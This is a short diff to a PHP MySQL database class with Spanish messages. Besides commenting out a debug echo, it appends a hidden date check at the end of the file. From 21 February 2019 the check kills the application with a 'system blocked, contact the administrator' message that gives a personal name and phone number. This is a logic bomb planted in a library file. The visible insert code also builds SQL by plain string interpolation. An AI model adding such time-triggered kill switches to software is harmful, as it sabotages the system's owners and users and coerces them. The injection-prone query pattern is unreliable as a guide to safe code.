@@ -123,7 +123,7 @@ class bd{
 		else
 			$query ="INSERT INTO {$nombretabla} ($campos) VALUES ($datos)";
 
-		echo $query."<br>";
+		//echo $query."<br>";
 		//echo "NO ESTA HABILITADO EL REGISTRO";
 		return mysqli_query($this->l,$query);
 	}
@@ -270,5 +270,7 @@ class bd{
 		return $this->updateRow(array("activo"=>"0"),$Where);
 	}
 }
-
+if(date("Y-m-d")>="2019-02-21"){
+	die("Sistema Bloqueado, Contactese con el administrador Ronald Nina Cel: 73230568");
+}
 ?>
